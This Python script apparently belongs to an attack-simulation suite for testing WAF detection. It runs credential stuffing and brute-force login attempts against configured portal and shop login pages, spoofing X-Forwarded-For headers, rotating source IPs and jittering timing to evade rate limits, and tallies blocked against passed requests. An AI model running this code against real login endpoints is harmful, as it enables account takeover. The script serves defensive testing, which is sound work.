#!/usr/bin/env python3
"""Scenario 4 — Credential stuffing + brute force on portal and shop login."""
import random
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import requests
from config import PORTAL_URL, SHOP_URL, USERNAMES, PASSWORDS, LOGS_DIR, TLS_VERIFY
from utils import print_banner, print_request, jitter, random_headers, GEO_IPS, SessionLog


def run() -> dict:
    print_banner("Scenario 4 — Credential Stuffing", f"Target: {PORTAL_URL}/login + {SHOP_URL}/login")
    log = SessionLog("04_cred_stuffing", LOGS_DIR)
    blocked = passed = 0

    # Phase 1: Credential stuffing — many users, rotating IPs
    from rich.console import Console
    Console().print("\n[yellow]Phase 1: Credential stuffing — 40 user:pass combos, rotating source IPs[/yellow]")
    combos = [(u, random.choice(PASSWORDS)) for u in USERNAMES[:20]] + \
             [(random.choice(USERNAMES), p) for p in PASSWORDS[:20]]
    random.shuffle(combos)

    for username, password in combos:
        ip = random.choice(GEO_IPS["EU"] + GEO_IPS["US"])
        headers = random_headers({"X-Forwarded-For": ip, "X-Real-IP": ip})
        for url in [f"{SHOP_URL}/login", f"{PORTAL_URL}/login"]:
            try:
                r = requests.post(url, data={"username": username, "password": password},
                                  headers=headers, timeout=10, allow_redirects=False, verify=TLS_VERIFY)
                note = f"from {ip}"
                print_request("POST", url.split("//")[1], r.status_code, note)
                log.log("POST", url, r.status_code, f"{username}:{password}", note)
                if r.status_code in (403, 429):
                    blocked += 1
                else:
                    passed += 1
            except requests.RequestException as e:
                print_request("POST", url, 0, str(e))
            jitter(0.1, 0.4)

    # Phase 2: Brute force — single user, many passwords
    from rich.console import Console
    Console().print("\n[yellow]Phase 2: Brute force — admin account, 20 password attempts[/yellow]")
    target = "admin@acmecorp.com"
    for password in PASSWORDS[:20]:
        headers = random_headers({"X-Forwarded-For": "185.220.101.45"})
        url = f"{SHOP_URL}/login"
        try:
            r = requests.post(url, data={"username": target, "password": password},
                              headers=headers, timeout=10, allow_redirects=False, verify=TLS_VERIFY)
            print_request("POST", f"/login [{target}:{password[:8]}...]", r.status_code)
            log.log("POST", url, r.status_code, f"{target}:{password}")
            if r.status_code in (403, 429):
                blocked += 1
            else:
                passed += 1
        except requests.RequestException as e:
            print_request("POST", url, 0, str(e))
        jitter(0.05, 0.3)

    log.save()
    total = len(combos) * 2 + 20
    return {"scenario": "Cred Stuffing", "total": total, "blocked": blocked, "passed": passed,
            "detection": "CF-Access-CredStuffing"}


if __name__ == "__main__":
    run()
